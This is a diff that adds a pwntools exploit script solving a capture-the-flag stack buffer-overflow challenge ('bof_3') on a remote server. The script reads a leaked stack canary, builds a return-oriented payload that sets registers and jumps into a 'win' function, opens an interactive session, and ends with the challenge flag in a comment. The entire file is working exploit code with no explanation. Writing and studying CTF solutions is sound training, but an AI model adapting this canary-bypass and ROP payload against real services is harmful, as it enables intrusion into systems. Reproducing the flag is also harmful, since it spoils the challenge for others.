@@ -1,0 +1,28 @@
+from pwn import *
+
+e = ELF("./bof_3")
+
+script = '''
+b *main
+'''
+
+p = remote("103.69.97.144", 6021)
+#p = process("./bof_3")
+#p = gdb.debug("./bof_3", gdbscript = script)
+
+pop_rdi = 0x0000000000401205
+pop_rsi = 0x000000000040120e
+win = e.symbols['win']
+
+p.recvuntil(b"canary is: ")
+canary = int(p.recvline(), 16)
+print(hex(canary))
+
+payload = b"A" * 0x58 + p64(canary) + p64(0)
+payload += p64(pop_rdi) + p64(0xDEADBEEFDEADBEEF)
+payload += p64(pop_rsi) + p64(0xDEADBEEFDEADBEEF)
+payload += p64(win + 5)
+p.sendlineafter(b"number: ", payload)
+
+p.interactive()
+#BKSEC{W3_4LL_Hat3_c4NARY}
